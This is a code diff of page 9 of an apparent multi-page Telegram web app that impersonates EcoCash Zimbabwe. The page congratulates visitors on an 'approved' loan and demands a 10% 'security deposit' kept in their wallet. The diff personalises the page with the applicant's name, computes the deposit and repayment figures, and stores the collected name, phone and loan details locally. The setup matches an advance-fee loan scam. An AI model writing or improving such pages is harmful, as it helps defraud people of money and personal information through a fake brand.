@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash Zimbabwe - Success</title>
+    <title>EcoCash Zimbabwe - Success (Page 9)</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* --- CSS STYLES --- */
@@ -211,25 +211,33 @@
             
             <div class="header-section">
                 <div class="check-circle">✓</div>
-                <div class="congrats-title">🎉 Congratulations!</div>
+                <div class="congrats-title" id="congrats-heading">🎉 Congratulations!</div>
                 <div class="sub-text">Your loan has been <b>approved!</b> Funds will be disbursed to your EcoCash wallet shortly.</div>
             </div>
 
             <div class="amount-box">
                 <div class="amount-label">APPROVED LOAN AMOUNT</div>
-                <div class="amount-value" id="display-amount">$100</div>
+                <div class="amount-value" id="display-amount">$100.00</div>
             </div>
 
             <div class="info-card">
                 <div class="info-header">⚠️ COMPLIANCE NOTICE</div>
                 <div class="info-body">
-                    Your EcoCash line must remain active and maintain a security balance of at least <b>10% of your requested loan amount</b>. This security deposit is fully refundable upon final loan repayment.
+                    Your EcoCash line must remain active and maintain a security balance of at least <b>10% (<span id="display-deposit">$10.00</span>)</b> of your requested loan amount. This security deposit is fully refundable upon final loan repayment.
                 </div>
             </div>
 
             <div class="details-list">
                 <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                     <span>💳</span> <b>Loan & Account Details</b>
+                </div>
+
+                <div class="detail-item" id="name-row" style="display: none;">
+                    <div class="icon-bg">👤</div>
+                    <div>
+                        <div class="detail-label">APPLICANT NAME</div>
+                        <div class="detail-val" id="display-name"></div>
+                    </div>
                 </div>
 
                 <div class="detail-item">
@@ -260,7 +268,7 @@
                     <div class="icon-bg">📈</div>
                     <div>
                         <div class="detail-label">INTEREST RATE</div>
-                        <div class="detail-val">8% APR</div>
+                        <div class="detail-val" id="display-rate">8% APR</div>
                     </div>
                 </div>
             </div>
@@ -285,36 +293,90 @@
     </div>
 
     <script>
+        // Helper to check URL parameters, localStorage, and sessionStorage in order
+        function getRecordedField(keys, fallback = null) {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const key of keys) {
+                if (urlParams.get(key)) return urlParams.get(key);
+                if (localStorage.getItem(key)) return localStorage.getItem(key);
+                if (sessionStorage.getItem(key)) return sessionStorage.getItem(key);
+            }
+            return fallback;
+        }
+
         window.onload = function() {
             if (window.Telegram?.WebApp) {
                 window.Telegram.WebApp.ready();
                 window.Telegram.WebApp.expand();
             }
 
-            // Retrieve recorded entries from URL params or localStorage
-            const urlParams = new URLSearchParams(window.location.search);
-            const paramPhone = urlParams.get('phone');
-            const savedPhone = paramPhone || localStorage.getItem('user_phone_number') || localStorage.getItem('phone');
-            
-            const loanAmount = localStorage.getItem('loan_amount') || "100";
-            const loanTerm = localStorage.getItem('loan_term') || "12";
-            const monthlyPay = localStorage.getItem('monthly_repayment') || "9";
+            // 1. Retrieve all recorded inputs from previous pages
+            const rawName = getRecordedField(['full_name', 'fullName', 'applicant_name', 'name']);
+            const rawPhone = getRecordedField(['user_phone_number', 'phone_number', 'phone', 'ecocash_number']);
+            const rawAmount = getRecordedField(['loan_amount', 'loanAmount', 'amount'], '100');
+            const rawTerm = getRecordedField(['loan_term', 'loanTerm', 'tenure', 'months'], '12');
+            const rawRate = getRecordedField(['interest_rate', 'interestRate', 'apr'], '8');
+            let rawMonthly = getRecordedField(['monthly_repayment', 'monthlyRepayment', 'monthly_payment']);
 
-            // Format numbers into USD currency strings
-            const formattedAmount = "$" + Number(loanAmount).toLocaleString();
-            const formattedMonthly = "$" + Number(monthlyPay).toLocaleString();
-            
-            let formattedPhone = "Not provided";
-            if (savedPhone) {
-                const cleanPhone = savedPhone.replace(/^\+/, '');
-                formattedPhone = cleanPhone.startsWith('263') ? `+${cleanPhone}` : `+263 ${cleanPhone}`;
+            // 2. Parse numeric values cleanly (stripping any '$' or text labels)
+            const amountNum = parseFloat(String(rawAmount).replace(/[^0-9.]/g, '')) || 100;
+            const termNum = parseInt(String(rawTerm).replace(/[^0-9]/g, ''), 10) || 12;
+            const rateNum = parseFloat(String(rawRate).replace(/[^0-9.]/g, '')) || 8;
+
+            // Calculate monthly repayment automatically if previous pages didn't store it
+            let monthlyNum;
+            if (rawMonthly) {
+                monthlyNum = parseFloat(String(rawMonthly).replace(/[^0-9.]/g, ''));
+            } else {
+                const monthlyRate = (rateNum / 100) / 12;
+                monthlyNum = (amountNum * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -termNum));
             }
 
-            // Update UI elements
-            document.getElementById('display-amount').innerText = formattedAmount;
+            // Calculate 10% required security deposit dynamically
+            const depositNum = amountNum * 0.10;
+
+            // 3. Format currency & phone strings
+            const formatUSD = (val) => "$" + val.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+            let formattedPhone = "Not provided";
+            if (rawPhone) {
+                const cleanPhone = rawPhone.replace(/\s+/g, '').replace(/^\+/, '');
+                if (cleanPhone.startsWith('263')) {
+                    formattedPhone = `+263 ${cleanPhone.slice(3)}`;
+                } else if (cleanPhone.startsWith('0')) {
+                    formattedPhone = `+263 ${cleanPhone.slice(1)}`;
+                } else {
+                    formattedPhone = `+263 ${cleanPhone}`;
+                }
+            }
+
+            // 4. Populate DOM elements
+            if (rawName) {
+                document.getElementById('congrats-heading').innerText = `🎉 Congratulations, ${rawName}!`;
+                document.getElementById('display-name').innerText = rawName;
+                document.getElementById('name-row').style.display = 'flex';
+            }
+
+            document.getElementById('display-amount').innerText = formatUSD(amountNum);
+            document.getElementById('display-deposit').innerText = formatUSD(depositNum);
             document.getElementById('display-phone').innerText = formattedPhone;
-            document.getElementById('display-term').innerText = loanTerm + " Months";
-            document.getElementById('display-monthly').innerText = formattedMonthly;
+            document.getElementById('display-monthly').innerText = formatUSD(monthlyNum);
+            document.getElementById('display-term').innerText = `${termNum} Months`;
+            document.getElementById('display-rate').innerText = `${rateNum}% APR`;
+
+            // 5. Save consolidated record for Page 9 summary/audit
+            const page9Record = {
+                page: 'public/page9.html',
+                applicantName: rawName || null,
+                phone: formattedPhone,
+                loanAmount: amountNum,
+                securityDeposit: depositNum,
+                loanTermMonths: termNum,
+                interestRateAPR: rateNum,
+                monthlyRepayment: Number(monthlyNum.toFixed(2)),
+                recordedAt: new Date().toISOString()
+            };
+            localStorage.setItem('page9_record', JSON.stringify(page9Record));
         };
     </script>
 </body>
